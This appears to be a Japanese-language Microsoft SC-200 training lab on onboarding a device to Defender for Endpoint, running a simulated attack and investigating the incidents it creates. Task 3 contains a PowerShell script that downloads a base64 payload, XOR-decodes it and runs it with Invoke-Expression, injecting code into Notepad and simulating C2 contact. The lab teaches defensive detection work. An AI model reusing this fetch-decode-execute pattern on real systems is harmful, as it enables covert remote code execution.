---
lab:
  title: 演習 4 - Microsoft Defender for Endpoint を使用した攻撃の軽減
  module: Learning Path 4 - Mitigate threats using Microsoft Defender for Endpoint
---

# ラーニング パス 4: ラボ 1: 演習 2: Microsoft Defender for Endpoint を使用した攻撃の軽減

## ラボのシナリオ

![ラボの概要。](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

あなたは Microsoft Defender for Endpoint を実装している企業で働いているセキュリティ運用アナリストです。 あなたの上司は、いくつかのデバイスをオンボードして、セキュリティ オペレーション (SecOps) チームの応答手順で必要な変更に関する情報を提供しようとしています。

Defender for Endpoint の攻撃の軽減機能を確認するために、デバイスのオンボードが成功したことを確認し、そのプロセス中に発生したアラートとインシデントを調査します。

### このラボの推定所要時間: 30 分

### タスク 1: デバイスのオンボードを確認する

このタスクでは、デバイスが正常にオンボードされていることを確認し、テスト アラートを作成します。

1. Microsoft Edge ブラウザーの Microsoft Defender XDR ポータルにまだアクセスしていない場合は、(<https://security.microsoft.com>) に移動して、お使いになっているテナントの管理者としてログインします。

1. 左側のメニューの **[アセット]** 領域の下で **[デバイス]** を選択します。 [デバイス] ページに WIN1 が表示されるまで待ち続けます。 そうしないと、後で生成されるアラートを表示するために、このタスクを繰り返さなければならなくなる可能性があります。

    >**注:**  オンボード プロセスを完了してから 1 時間経ってもデバイス一覧にデバイスが表示されない場合は、オンボードまたは接続に問題があるおそれがあります。

1. Microsoft Defender XDR ポータルの左側のメニュー バーで、**[システム]** セクションを展開して **[設定]** を選択した後、*[設定]* ページから **[エンドポイント]** を選択します。

1. [デバイス管理] セクションで **[オンボード]** を選択し、 *[Windows 10 と 11]* がオペレーティング システムとして選択されていることを確認します。 *"最初のデバイスがオンボードされました"* というメッセージが *[完了]* と表示されるようになります。

1. 下にスクロールし、セクション *[2. 検出テストを実行します]* の下で **[コピー]** ボタンを選択して、検出テストのスクリプトをコピーします。  

1. WIN1 仮想マシンの Windows 検索バーで「**CMD**」と入力し、コマンド プロンプト アプリの右側のペインで **[管理者として実行]** を選択します。

1. [ユーザー アカウント制御] ウィンドウが表示されたら **[はい]** を選択し、アプリの実行を許可します。 

1. **[管理者: コマンド プロンプト]** ウィンドウでスクリプトを右クリックして貼り付け、**Enter** キーを押して実行します。

    >**注:**  このウィンドウは、スクリプトが正常に実行されると自動的に閉じられ、数分後に Microsoft Defender XDR ポータル内にアラートが生成されます。

### タスク 2:アラートとインシデントを調査する

このタスクでは、先ほどのタスクのオンボード検出テスト スクリプトによって生成されたアラートとインシデントを調査します。

1. Microsoft Defender XDR ポータルで、左側のメニュー バーから **[調査と対応]** を展開した後、**[インシデントとアラート]** を展開して **[アラート]** を選択します。

    >**注:**  更新されたバージョンの Microsoft Defender XDR ポータル ページでは、*[インシデントとアラート]* は *[調査と応答]* メニュー見出しの下にあります。

1. **[アラート]** ペインで、"[TestAlert] 疑わしい PowerShell コマンドライン" という名前のアラートを選択してその詳細を読み込みます。**

1. "アラート ストーリー" タイムラインを確認した後、"詳細" タブと "おすすめ" タブを確認します。******

    >**注:**  アラートの "詳細" タブで、"インシデントの詳細" セクションまで下にスクロールし、"1 つのエンドポイント上の実行インシデント" リンクを選択することでインシデントを開くことができます。******

1. Microsoft Defender XRD ポータルで、左側のメニュー バーから **[インシデントとアラート]** を選択した後、**[インシデント]** を選択します

1. フィルターの右側にある **[X]** を選択して、"アラートの重大度" フィルターをクリアします。**

1. "[TestAlert] 疑わしい PowerShell コマンドライン" という名前の新しいインシデントが右側のペインに表示されます。** インシデント名を選択して詳細を読み込みます。

1. (鉛筆アイコンが付いている) **[インシデントの管理]** リンクを選択すると、新しいウィンドウ ブレードが表示されます。

1. **[Incident tags]\(インシデント タグ\)** に「Simulation」と入力し、**[Simulation (Create new)]\(シミュレーション (新規作成)\)** を選んで新しいタグを作成します。

1. **[割り当て先]** トグルを選択して、インシデントの所有者として自分のユーザー アカウント (Me) を追加します。

1. **[分類]** で、ドロップダウン メニューを展開します。

1. **[情報、予期されるアクティビティ]** で、 **[セキュリティ テスト]** を選択します。

1. **[保存]** を選択して、インシデントを更新し、完了します。

1. *[Attack story] (攻撃ストーリー)、[アラート]、[資産]、[調査]、[Evidence and Response] (証拠と応答)* 、および *[概要]* タブの内容を確認します。 "デバイスとユーザー" は "アセット" タブにあります。** 実際のインシデントでは、"攻撃ストーリー" タブに "インシデント グラフ" が表示されます。**** **ヒント:** 一部のタブは、ディスプレイのサイズが原因で非表示になる場合があります。 省略記号タブ (...) を選択して表示します。

### タスク 3 攻撃をシミュレートする

>**警告:** このシミュレーション攻撃は、実践を通して学ぶための優れた情報源です。 コースで提供される Azure テナントを使用する場合は、このラボで提供されている手順にある攻撃のみを実行してください。  他のシミュレーション攻撃は、このテナントでこのトレーニング コースが完了した "後" に実行できます。**

このタスクでは、WIN1 仮想マシンに対する攻撃をシミュレートし、Microsoft Defender for Endpoint によって攻撃が検出され、軽減されることを確認します。

1. WIN1 仮想マシンで、**[スタート]** ボタンを "右クリックし"、**[Windows PowerShell (管理者)]** を選択します。**

1. [ユーザー アカウント制御] ウィンドウが表示されたら **[はい]** を選択し、アプリの実行を許可します。

1. 次のシミュレーション スクリプトをコピーして PowerShell ウィンドウに貼り付け、**Enter** キーを押して実行します。

    ```PowerShell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```

    >**注:**  スクリプトの実行中にエラー (赤色) が発生した場合は、メモ帳アプリを開き、スクリプトを空のファイルにコピーできます。 メモ帳で "右端での折り返し" がオンになっていることを確認してください。** 次に PowerShell でスクリプトの各行を個別にコピーして実行します。 また、ラボの開始時にダウンロードしたファイルの中に PowerShell スクリプト (attacksim.ps1) が含まれています。 このスクリプトを使用するには、**Windows PowerShell (管理者)** で *\Users\Admin\Desktop\Allfiles* フォルダーに移動し、「*.\attacksim.ps1*」と入力した後 **Enter** キーを押してこれを実行します。

1. スクリプトによって複数行の出力が生成され、"Failed to resolve Domain Controllers in the domain (ドメインのドメイン コントローラーを解決できませんでした)" というメッセージが表示されます。** 数秒後に、"メモ帳" アプリが開きます。** シミュレートされた攻撃コードがメモ帳に挿入されます。 完全なシナリオを体験するには、自動的に生成されたメモ帳インスタンスを開いたままにします。 シミュレートされた攻撃コードは、外部 IP アドレスへの通信 (C2 サーバーのシミュレート) を試みます。

### タスク 4:シミュレーション攻撃を 1 つのインシデントとして調査する

1. Microsoft Defender XDR ポータルで、左側のメニュー バーから **[調査と対応]** を展開した後、**[インシデントとアラート]** を展開して **[インシデント]** を選択します。

    >**注:**  更新されたバージョンの Microsoft Defender XDR ポータル ページでは、*[インシデントとアラート]* は *[調査と応答]* メニュー見出しの下にあります。

1. *[Multi-stage incident involving Defense evasion & Discovery on one endpoint]\(1 つのエンドポイントでの防御回避と検出を含むマルチステージ インシデント\)* という名前の新しいインシデントが右側のウィンドウに表示されます。 インシデント名を選択して詳細を読み込みます。

    >**注:**  インシデントが表示されない場合は、フィルターの右側にある **[X]** を選択して、"アラートの重大度" フィルターをクリアするようにしてください。**

1. *[Attack story]\(攻撃ストーリー\)* タブで、**[アラート]** および **[インシデントの詳細]** ウィンドウを折りたたんで、**インシデント グラフ**全体を表示します。

1. **インシデント グラフ ノード**にマウス ポインターを合わせて選択し、"エンティティ" を確認します。**

1. **[アラート]** ウィンドウ (左側) をもう一度展開し、**[Play attack story]\(攻撃ストーリーの再生\)**、*[実行]* アイコンを選択します。 これにより、攻撃タイムラインがアラートごとに表示され、"インシデント グラフ" が動的に設定されます。**

1. *[Attack story] (攻撃ストーリー)、[アラート]、[資産]、[調査]、[Evidence and Response] (証拠と応答)* 、および *[概要]* タブの内容を確認します。 "デバイスとユーザー" は "アセット" タブにあります。****ヒント:** 一部のタブは、ディスプレイのサイズが原因で非表示になる場合があります。 省略記号タブ (...) を選択して表示します。

1. **Evidence and Response]\(証拠と応答\)** タブで、**[IP アドレス]** を選択し、表示された *IP アドレス* を選択します。 ポップアップ ウィンドウで IP アドレスの詳細を確認し、下にスクロールして **[Open IP address page]\(IP アドレスのページを開く\)** ボタンを選択します。

1. *[IP アドレス]* ページで [概要]、[インシデントとアラート]、[Observed in organizations]\(組織の監視対象\) の各タブの内容を確認します。** 一部のタブには、IP アドレスに関する情報が含まれていない場合があります。

## これでラボは完了です